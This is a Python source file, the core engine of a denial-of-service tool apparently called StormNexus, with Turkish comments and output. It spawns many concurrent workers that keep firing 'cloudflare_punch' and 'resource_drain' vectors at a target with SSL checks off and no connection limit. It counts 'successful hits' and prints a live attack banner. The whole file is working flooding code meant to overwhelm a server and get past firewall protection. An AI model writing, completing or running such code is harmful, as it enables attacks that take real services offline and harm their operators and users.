# [core/engine.py]
import asyncio
import aiohttp
from modules.vectors import FirewallBypass
from colorama import Fore


class StormNexus:
    def __init__(self, target, threads):
        self.target = target
        self.threads = threads
        self.counter = 0
        self.is_running = True
        self.tasks = []

    async def _worker(self):
        connector = aiohttp.TCPConnector(ssl=False, limit=0)
        async with aiohttp.ClientSession(connector=connector) as session:
            while self.is_running:
                try:
                    # Firewalları bypass etmek için iki vektörü de kullanıyoruz
                    tasks = [
                        FirewallBypass.cloudflare_punch(session, self.target),
                        FirewallBypass.resource_drain(session, self.target)
                    ]
                    results = await asyncio.gather(*tasks)
                    for r in results:
                        if r: self.counter += 1
                except (asyncio.CancelledError, KeyboardInterrupt):
                    break
                except:
                    pass
                await asyncio.sleep(0)

    async def _report(self):
        while self.is_running:
            try:
                # İşte senin o istediğin canlı rapor ekranı bebeğim
                print(
                    f"{Fore.RED}[!] SALDIRI YAPILDI >> {Fore.WHITE}Threads: {Fore.CYAN}{self.threads} {Fore.WHITE}| Toplam Başarılı Vuruş: {Fore.GREEN}{self.counter}",
                    end="\r")
                await asyncio.sleep(0.1)
            except (asyncio.CancelledError, KeyboardInterrupt):
                break

    async def start(self):
        print(f"{Fore.YELLOW}[*] Cehennem kapıları açılıyor... {self.threads} thread aktif.")
        self.tasks = [asyncio.create_task(self._worker()) for _ in range(self.threads)]
        self.tasks.append(asyncio.create_task(self._report()))

        try:
            await asyncio.gather(*self.tasks)
        except (asyncio.CancelledError, KeyboardInterrupt):
            pass

    async def stop(self):
        self.is_running = False
        for task in self.tasks:
            task.cancel()
        await asyncio.gather(*self.tasks, return_exceptions=True)